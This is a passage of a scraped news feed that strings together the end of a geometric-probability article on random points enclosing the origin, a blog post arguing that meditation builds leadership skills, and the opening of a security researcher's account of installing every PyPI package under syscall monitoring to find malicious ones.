<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td><p nowrap="">
(<i>w</i>,<i>x</i>,<i>y</i>,<i>z</i>),(<i>w</i>,<i>x</i>,<i>y</i>,-<i>z</i>),(<i>w</i>,<i>x</i>,-<i>y</i>,<i>z</i>),(<i>w</i>,-<i>x</i>,<i>y</i>,<i>z</i>),</p></td>
</tr><tr><td><p nowrap="">
(<i>w</i>,<i>x</i>,-<i>y</i>,-<i>z</i>),(<i>w</i>,-<i>x</i>,-<i>y</i>,<i>z</i>),(<i>w</i>,-<i>x</i>,<i>y</i>,-<i>z</i>),(<i>w</i>,-<i>x</i>,-<i>y</i>,-<i>z</i>).</p></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
Each point in the tetrahedron with vertices <i>P</i><sub>0</sub>, <i>P</i><sub>1<i>j</i><sub>1</sub></sub>, <i>P</i><sub>2<i>j</i><sub>2</sub></sub>,<i>P</i><sub>3<i>j</i><sub>3</sub></sub> can be uniquely represented as a <i>convex combination </i>

</p><center><div>
<table><tbody><tr><td nowrap="">
<span face="symbol">b</span><sub>0</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>1</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>2</sub> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>3</sub></td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>

 
(where each <span face="symbol">b</span><sub><i>i</i></sub>  <span face="symbol">³</span> 0 and <span face="symbol">b</span><sub>0</sub> + <span face="symbol">b</span><sub>1</sub> + <span face="symbol">b</span><sub>2</sub> +<span face="symbol">b</span><sub>3</sub> = 1), so the origin is contained in the tetrahedron
<i>P</i><sub>0</sub><i>P</i><sub>1<i>j</i><sub>1</sub></sub><i>P</i><sub>2<i>j</i><sub>2</sub></sub><i>P</i><sub>3<i>j</i><sub>3</sub></sub> if and only if the 4-tuple solving the
associated vector equation

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


consists of four coordinates of the same sign.  Since only one of the 
above eight solutions has this property, only one of the eight equally 
likely tetrahedra contains the origin, and hence the probability that the 
origin is contained in the randomly chosen tetrahedron is 1/8.

<h2><a name="tth_sEc2">
2</a>&nbsp;&nbsp;First Generalization</h2>

<p>
So far, so good.  This solution generalizes in the obvious way and gives us
the answer of 1/2<sup><i>n</i></sup> to question <b>(1)</b> in the above list.  But what of
question <b>(2)</b>?  The above approach seems inadequate in this case, since
points can now be chosen anywhere along the randomly chosen diameters.  

</p><p>
Let us employ one of the standard procedures when faced with a difficult
problem:  that of changing the problem to something easier.  We will
attempt first to answer question <b>(2)</b> in  <b><i>R</i></b><sup>2</sup>.  Specifically, if three
points are chosen at random from the unit disk <i>B</i><sup>2</sup>, what is the
probability that the triangle thus formed contains the origin? Let us
further simplify the problem by assuming that we are choosing three points
at random with respect to a probability measure <i>P</i> on <i>B</i><sup>2</sup> which is <i>
rotationally invariant </i>;  that is, measures of subsets of <i>B</i><sup>2</sup> are
unchanged under rotational translations.  We will also continue to assume
the appropriate degree of non-degeneracy of the measure (more on this in
the next section).

</p><p>
Since we are assuming rotational invariance, we can assume that the first
point <i>P</i><sub>1</sub> is fixed between 0 and 1 on the positive <i>x</i>-axis.  With
probability one, the second point <i>P</i><sub>2</sub> of the triangle is not located at
the origin, and we can form the ray starting at the origin and passing
through <i>P</i><sub>2</sub>.  Let <span face="symbol">q</span> be the angle between the positive <i>x</i>-axis and
this ray.  The question can now be posed as a conditional probability
problem:  given <span face="symbol">q</span>, what is the probability that the third point
<i>P</i><sub>3</sub> defines a triangle which contains the origin? Integrating this
probability over all possible <span face="symbol">q</span>'s will then give us the answer we
seek.

</p><p>
In order to simplify our work, let us agree upon some notation.  Given a
point <i>P</i> in <i>B</i><sup>2</sup> -{(0,0)}, let <span face="symbol">Q</span>(<i>P</i>) denote the angle from the
positive <i>x</i>-axis to the ray beginning at the origin and passing through
<i>P</i> (see Figure 2).  Thus, <span face="symbol">q</span><sub>1</sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i>)  <span face="symbol">£</span> <span face="symbol">q</span><sub>2</sub> will
indicate that <i>P</i> lies in the sector of <i>B</i><sup>2</sup> defined by the angles
<span face="symbol">q</span><sub>1</sub> and <span face="symbol">q</span><sub>2</sub>.  Let <i>P</i>(capture) denote the probability
that the origin is captured within the triangle formed by the three points
<i>P</i><sub>1</sub>, <i>P</i><sub>2</sub> and <i>P</i><sub>3</sub>.  Thus, the first task is to calculate
<i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>), for each <span face="symbol">q</span> <span face="symbol">Î</span> [0,2<span face="symbol">p</span>].

</p><center><img src="https://lsusmath.rickmabry.org/psisson/putnam/two.gif" width="300" height="300"></center>
 
<center>Figure 2: Illustration of <span face="symbol">Q</span>(<i>P</i><sub>2</sub>) for a typical <i>P</i><sub>2</sub>.</center>
 
<p>
Suppose first that 0  <span face="symbol">£</span> <span face="symbol">q</span> <span face="symbol">£</span> <span face="symbol">p</span>.  It is not difficult to see that
a necessary and sufficient condition for capture is that <span face="symbol">p</span> <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>3</sub>)  <span face="symbol">£</span> <span face="symbol">p</span>+ <span face="symbol">q</span>.  That is, the ray from the origin to <i>P</i><sub>3</sub>
must pass through <i>S</i><sup>1</sup> (the boundary of <i>B</i><sup>2</sup>) at a point between <span face="symbol">p</span>
units and <span face="symbol">p</span>+ <span face="symbol">q</span> units, as measured from the positive <i>x</i>-axis.
Since the length of this arc is <span face="symbol">q</span>, this conditional probability is
<span face="symbol">q</span>/2<span face="symbol">p</span>, i.e. <i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) = <span face="symbol">q</span>/2<span face="symbol">p</span>.  Similarly, if <span face="symbol">p</span> <span face="symbol">£</span> <span face="symbol">q</span> <span face="symbol">£</span> 2<span face="symbol">p</span>, <i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) = 1 - <span face="symbol">q</span>/2<span face="symbol">p</span>.

</p><p>
We can now approximate our solution with an appropriate Riemann sum.  Let 
{ <span face="symbol">q</span><sub>0</sub>, <span face="symbol">¼</span>, <span face="symbol">q</span><sub><i>n</i></sub> } be a partition of [0,2<span face="symbol">p</span>].  Then

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td></td><td><table><tbody><tr><td nowrap="">
 <span face="symbol">»</span> </td><td nowrap="">
<span size="-1"><i>n</i>-1</span> <br><span face="symbol" size="+3">å<br></span>
<span size="-1"><i>i</i> = 0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>)  <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>) &nbsp;<i>P</i>(<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>) <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>)  </td></tr></tbody></table></td>
</tr><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td nowrap="">
<span size="-1"><i>n</i>-1</span> <br><span face="symbol" size="+3">å<br></span>
<span size="-1"><i>i</i> = 0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>)  <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>) &nbsp;</td><td nowrap="">
<span face="symbol">D</span><span face="symbol">q</span><sub><i>i</i></sub><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
.</td></tr></tbody></table></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
In the limit of finer and finer partitions, we obtain

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1">2<span face="symbol">p</span></span> <span size="-1">0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) &nbsp;</td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
 </td></tr></tbody></table></td>
</tr><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1"><span face="symbol">p</span></span> <span size="-1">0</span>&nbsp;<br></td><td nowrap="">
</td><td nowrap="">
<span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
&nbsp; </td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
+ </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1">2<span face="symbol">p</span></span> <span size="-1"><span face="symbol">p</span></span>&nbsp;<br></td><td nowrap="">
</td><td><span face="symbol">
æ<br>ç<br>
è
</span></td><td nowrap="">
1 - </td><td nowrap="">
<span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td><span face="symbol">
ö<br>÷<br>
ø
</span></td><td nowrap="">
&nbsp;</td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
 </td></tr></tbody></table></td>
</tr><tr><td></td><td></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
Examination of this argument shows that we have answered more than we set
out to, since the fact that <i>P</i> is a probability measure on <i>B</i><sup>2</sup> is really
irrelevant.  As long as <i>P</i> is a probability measure on  <b><i>R</i></b><sup>2</sup> which is
rotationally invariant and suitably non-degenerate, the result is the same.
We are already aware of one consequence of this:  if <i>P</i> is a uniformly
distributed probability measure on <i>S</i><sup>1</sup>, the method of Klosinski,
Alexanderson and Larson tells us that with probability 1/4 the origin
will be contained in a randomly chosen triangle.  We can also begin to make
sense of question <b>(4)</b> by noting that if <i>P</i> is the usual Gaussian
probability measure on all of  <b><i>R</i></b><sup>2</sup>, the probability that three randomly
chosen points captures the origin is again 1/4.

</p><p>
A related problem in geometric probability, whose many variants are dealt
with in [<a href="#hall" name="CITEhall">1</a>], [<a href="#kendalls" name="CITEkendalls">2</a>], [<a href="#lang1" name="CITElang1">4</a>], [<a href="#lang2" name="CITElang2">5</a>] and
[<a href="#san" name="CITEsan">6</a>], is to find the probability that three points chosen at random
from a region in the plane will form an acute triangle.  One version can be
easily answered here.  Since the origin is captured by three points chosen
at random from the unit circle if and only if the three points form an
acute triangle, the probability that an acute triangle is formed by three
points chosen at random from <i>S</i><sup>1</sup> is also 1/4.

</p><p>
The results above suggest that under rather general circumstances <i>n</i>+1
points chosen randomly from a region in  <b><i>R</i></b><sup><i>n</i></sup> which is symmetric with
respect to the origin will capture the origin with probability 1/2<sup><i>n</i></sup>. Our
main result gives conditions which guarantee the …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm">https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm</a></em></p>]]>
            </description>
            <link>https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070681</guid>
            <pubDate>Thu, 12 Nov 2020 15:11:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For leaders, meditation is more useful than business school]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070677">thread link</a>) | @lzybes
<br/>
November 12, 2020 | https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school | <a href="https://web.archive.org/web/*/https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Meditation makes people better leaders, and when done consistently can be more effective than any knowledge on leadership one could acquire. Hard stop.</p>
<!--more-->
<p>If you are in a leadership position, nearly all acquired knowledge (including any degree on which you spent many tens of thousands of dollars) is obsolete the moment it’s acquired, given the pace of change today. By definition, leadership involves facing and navigating ambiguity and change and helping others to do the same, a task at which acquired knowledge, or even practice,<span>&nbsp;</span><a href="https://www.businessinsider.com/new-study-destroys-malcolm-gladwells-10000-rule-2014-7" rel="noopener" target="_blank">produces outcomes only about 1% better than doing nothing at all</a>. As Naval Ravikant, founder of AngelList, prolific angel investor and Twitter philosopher says, “<a href="https://twitter.com/naval/status/1002103360646823936" rel="noopener" target="_blank">there’s no skill called ‘business’</a>” that you can learn.</p>
<p>Much better, then, to develop your ability to navigate change and uncertainty. Better to hone your ability to make good decisions, free from unconscious bias, and invest in your ability to connect with, understand, and lead your people. These are the traits of a successful leader today.</p>
<p>Those are also the results one can expect of meditation.</p>
<div><p><img src="https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=1489&amp;name=meditation.png" alt="meditation" width="1489" srcset="https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=745&amp;name=meditation.png 745w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=1489&amp;name=meditation.png 1489w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=2234&amp;name=meditation.png 2234w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=2978&amp;name=meditation.png 2978w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=3723&amp;name=meditation.png 3723w, https://www.purpose.jobs/hs-fs/hubfs/meditation.png?width=4467&amp;name=meditation.png 4467w" sizes="(max-width: 1489px) 100vw, 1489px"></p></div>
<h2>Three offerings of meditation</h2>
<p>Leaders are often driven by attaining goals—by success. This makes meditation hard to navigate for some at first because, by its nature, meditation is about letting go. Any amount of chasing “good meditation” will only bring you farther away from the remarkable benefits that it can bring.</p>
<p>That said, if you haven’t already developed a practice and are wondering why anyone would invest in “sitting quietly not doing much” rather than checking another email off the list or attending leadership classes, allow me to suggest that <strong>one would choose meditation if one wanted to strengthen the following three attributes:&nbsp;Concentration. Equanimity. Insight.</strong></p>
<h3><strong>Concentration:</strong></h3>
<p><em>— the action or power of focusing one’s attention or mental effort</em></p>
<p>It seems like anyone should be able to focus on something for a minute, without getting distracted by thought. It’s only a minute, right?</p>
<p>Neuroscientist Sam Harris offers an experiment, to test this:</p>
<blockquote>
<p><strong>See if you can stop thinking for the next 60 seconds. &nbsp;You can notice your breath, or listen to the birds, but do not let your attention be carried away by thought,&nbsp;<em>any thought</em>, even for an instant. &nbsp; Some of you will be so distracted by thought as to imagine that you succeeded. &nbsp;In fact, beginning meditators often think that they are able to concentrate on a single object, such as the breath, for minutes at a time, only to report after days or weeks of intensive practice that their attention is now carried away by thought every few seconds. &nbsp;This is actually progress. &nbsp;It takes a certain degree of concentration to even notice how distracted you are. &nbsp;Even if your life depended on it, you could not spend a full minute free of thought.</strong></p>
</blockquote>
<p>Meditation is, in essence, practicing focusing. Whether the object of meditation is the breath, a mantra, or even if you’re practicing objectless meditation like Shikantaza, you’re directly flexing your concentration muscle. And like any muscle, over time it gets get stronger.</p>
<p>Leadership is distracting, by nature. Between status updates with team members, strategy sessions, business development, fire dousing and the rest, most leaders can’t afford much time to dive deep into focused time, regardless of how important they know it to be (hint: it’s not just leaders). Being distracted and “busy” has become so ingrained in our culture that we glorify<span>&nbsp;</span><a href="https://health.clevelandclinic.org/science-clear-multitasking-doesnt-work/" rel="noopener" target="_blank">fundamentally impossible things like multitasking</a>. But that really only serves as an emotional justification for our painful inability to focus.</p>
<p>The reality is, to make progress in anything requires focus, and the more consecutive moments of focus you can muster on a single item, the quicker progress happens. Particularly in leadership, when you must dive into a situation, focus, and then jump out quickly before diving back into another situation, the ability to focus deeply on a problem or situation at will without getting distracted is critical.</p>
<div><p>You may not make it a minute, but meditation is the most direct way to ratchet up your Concentration stamina.</p></div>
<h3><strong>Equanimity:</strong></h3>
<p>—<span>&nbsp;</span><em>mental calmness, composure, and evenness of temper, especially in a difficult situation</em></p>
<p>We notice things happening as we move throughout the world, but most of us don’t also notice the corresponding sensation in our body or thought in our mind. For every thing that happens in your external world, there is a corresponding internal marker, whether it be a body sensation, a thought or an emotion.</p>
<p>Whether conscious or not, most people spend most of their lives managing these sensations, thinking they’re operating within an external world. Two of the biggest triggers for people are change and uncertainty, which our mid- and post-COVID world has in spades. The world might trigger an emotion like dread (say your Controller says to you: “we need to talk”), which if unnoticed can literally color your entire reaction to the situation, and drive suboptimal outcomes that you look back on with regret.<span>&nbsp;</span><a href="http://ryanhvaughn.com/seeing-the-wave/" rel="noopener" target="_blank">Not that I know anything about that</a>.</p>
<p>Meditation gives us a space to see this mechanism in action. To literally watch the sensory nature of our world, and watch how those sensations trigger habitual reactions. To see dread for what it is: a mix of sensations, thoughts and emotions, none of which mean much at all despite their perceived intensity. And sitting still with our eyes closed, meditation offers the opportunity to practice experiencing these sensations without automatically reacting.&nbsp;</p>
<p>Through meditative practice, you develop your ability to experience thoughts/feelings/sensations as they are, without reacting to them, judging them, or needing to change or add to them.<span>&nbsp;</span><a href="http://ryanhvaughn.com/how-leaning-in-to-my-greatest-fear-enabled-me-to-make-better-decisions/" rel="noopener" target="_blank">So that in situations of intense emotion, instead of making a reflexive decision you regret, you develop your ability to pause, let the feeling happen, and then act.</a><span>&nbsp;</span>You develop the power to remain calm in crazy situations, not because you’re not feeling the craziness, but because you’ve trained in how to manage it.</p>
<div><p>In other words, you develop Equanimity.</p></div>
<h3><strong>Insight:</strong></h3>
<p>—<span>&nbsp;</span><em>direct, experiential understanding into the true nature of things</em></p>
<p>You probably think you know the true nature of things already—that you live in reality. If so, you’re wrong.</p>
<p>Not because Elon Musk is right and<span>&nbsp;</span><a href="https://www.space.com/41749-elon-musk-living-in-simulation-rogan-podcast.html" rel="noopener" target="_blank">we’re living in a computer simulation</a>, but because your mind has created innumerable virtual realities to help it navigate the world, and then mistakes those abstractions for the real thing.</p>
<p>This is helpful in many cases. For example, I can type many words per minute on this keyboard because my mind has created a mental model of how words translate to letters and then to finger strokes. I don’t have to interact with the actual complexity of the keyboard, the electricity that powers it and the connections to the black pixels appearing on the screen (reality), nor do I want to. It’s useful to live in the reality of simply words showing up on the screen while my hands go on autopilot. We do this type of abstraction to everything in our world, thereby isolating ourselves from reality in a bubble of abstractions, which we interact with as if they are actually real. Much of the time it’s a superpower, without which society as we know it would not be possible.</p>
<p>But this process of abstracting reality can also prevent us from seeing truths that are right in front of us, and actively inhibit us from making good decisions. Such as if we develop an abstract model of Bob from accounting as reliable and happy, and relate to him as such all the way until he blindsides us with his two week notice. As Mark Twain said, “What gets us into trouble is not what we don’t know. It’s what we know for sure that just ain’t so.”</p>
<p>Ray Dalio, billionaire hedge fund owner, author of the amazing book<span>&nbsp;</span><a href="https://www.amazon.com/Principles-Life-Work-Ray-Dalio/dp/1501124021" rel="noopener" target="_blank">Principles</a>, and possibly the most intentional decision maker in the world, agrees,<span>&nbsp;</span><a href="https://www.linkedin.com/posts/raydalio_principleoftheday-activity-6659100390421733377-0b0B" rel="noopener" target="_blank">adding</a>, “Most people make bad decisions because they’re so certain they’re right that they don’t allow themselves to see the better alternatives that exist.”</p>
<p>In other words, we interact with our mental models of reality as if they were real, and in doing so miss key aspects of a situation that, were we to see them, might change our perspective. Our version of reality has blind spots (if you’re still skeptical,<span>&nbsp;</span><a href="https://faculty.washington.edu/chudler/chvision.html" rel="noopener" target="_blank">try this experiment</a>).</p>
<p>Dalio (<a href="https://www.cnbc.com/2019/07/01/transcendental-meditation-helped-ray-dalio-recover-from-financial-ruin.html" rel="noopener" target="_blank">unsurprisingly an avowed meditator himself</a>) elaborates, calling out two key inhibitors to good decision making within our distorted version of reality: Ego and Blind Spots.<span>&nbsp;</span><a href="https://www.linkedin.com/posts/raydalio_principleoftheday-activity-6657359529312829440-ceHp" rel="noopener" target="_blank">Dalio said</a>, “The two biggest barriers to good decision making are your ego and your blind spots. Together, they make it difficult for you to objectively see what is true about you and your circumstances and to make the best possible decisions by getting the most out of others. If you can understand how the machine that is the human brain works, you can understand why these barriers exist and how to adjust your behavior to make yourself happier, more effective, and better at interacting with others.”</p>
<p>To maximize our potential as leaders, we must develop the ability to discern between useful abstractions like the keyboard, and harmful ones like our ego or beliefs based on faulty and unexamined premises. This skill requires first the humility to admit our perception of reality is fundamentally inaccurate at virtually all times (useful sometimes, yes, but still wrong), and second the willingness and ability to dissect our perception into its parts to determine what is actually true or useful, and what is not.</p>
<p><strong>Enter meditation.</strong></p>
<p>Through meditation we learn to understand reality on reality’s terms, seeing our biases, beliefs and other mental landmines in action. Seeing the mechanistic nature of our thoughts first hand while meditating has the affect of loosening our attachment to them, and giving us the choice to not respond or react. Meditation is a direct path to understanding how the machine that is the human brain works.</p>
<p>One of the early insights gained by meditators is that …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school">https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school</a></em></p>]]>
            </description>
            <link>https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070677</guid>
            <pubDate>Thu, 12 Nov 2020 15:10:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hunting for Malicious Packages on PyPI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070672">thread link</a>) | @jwcrux
<br/>
November 12, 2020 | https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/ | <a href="https://web.archive.org/web/*/https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<article>

<section>
<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
